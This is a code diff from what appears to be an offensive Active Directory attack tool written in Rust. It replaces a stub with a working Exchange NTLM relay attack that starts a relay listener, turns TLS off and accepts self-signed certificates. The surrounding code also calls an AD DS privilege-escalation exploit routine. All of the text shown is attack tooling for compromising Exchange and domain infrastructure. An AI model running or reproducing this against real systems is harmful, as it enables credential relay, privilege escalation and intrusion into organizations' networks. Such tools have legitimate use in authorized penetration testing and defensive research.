@@ -588,16 +588,25 @@ async fn dispatch_cve_attack(config: &HuntConfig, attack: &CveAttackType) -> Cve
         CveAttackType::ExchangeRelay {
             target_exchange,
             relay_port,
-        } => CveAttackResult {
-            cve_id: cve_id.to_string(),
-            name: name.to_string(),
-            success: false,
-            summary: format!(
-                "Stub — use overthrone-relay standalone (Exchange: {target_exchange}:{relay_port})"
-            ),
-            log: vec![log(
-                "Exchange relay requires the standalone relay crate".into()
-            )],
+        } => match run_cve_exchange_relay(config, target_exchange, *relay_port).await {
+            Ok(()) => CveAttackResult {
+                cve_id: cve_id.to_string(),
+                name: name.to_string(),
+                success: true,
+                summary: format!(
+                    "Exchange relay completed against {target_exchange}:{relay_port}"
+                ),
+                log: vec![log(
+                    format!("Exchange relay to {target_exchange}:{relay_port} completed")
+                )],
+            },
+            Err(e) => CveAttackResult {
+                cve_id: cve_id.to_string(),
+                name: name.to_string(),
+                success: false,
+                summary: format!("Exchange relay failed: {e}"),
+                log: vec![log(format!("Error: {e}"))],
+            },
         },
     }
 }
@@ -701,6 +710,34 @@ async fn run_cve_cba_bypass(config: &HuntConfig) -> Result<CbaBypassResult> {
 async fn run_cve_ad_ds_eop(config: &HuntConfig) -> Result<AdDsEopResult> {
     let mut ldap = connect_ldap(config).await?;
     exploit_ad_ds_eop(&mut ldap, &config.dc_ip, None).await
+}
+
+async fn run_cve_exchange_relay(
+    config: &HuntConfig,
+    target_exchange: &str,
+    relay_port: u16,
+) -> Result<()> {
+    use overthrone_relay::exchange::{ExchangeRelay, ExchangeRelayConfig};
+
+    let relay_cfg = ExchangeRelayConfig {
+        listen_ip: config.dc_ip.clone(),
+        target_host: target_exchange.to_string(),
+        target_port: relay_port,
+        use_tls: false,
+        accept_self_signed: true,
+        ..Default::default()
+    };
+
+    let mut relay = ExchangeRelay::new(relay_cfg);
+    info!("Starting Exchange relay to {target_exchange}:{relay_port}");
+    relay.start().await?;
+
+    // Run for a limited duration
+    tokio::time::sleep(tokio::time::Duration::from_secs(config.timeout)).await;
+
+    relay.stop().await;
+    info!("Exchange relay completed");
+    Ok(())
 }
 
 // ═══════════════════════════════════════════════════════════
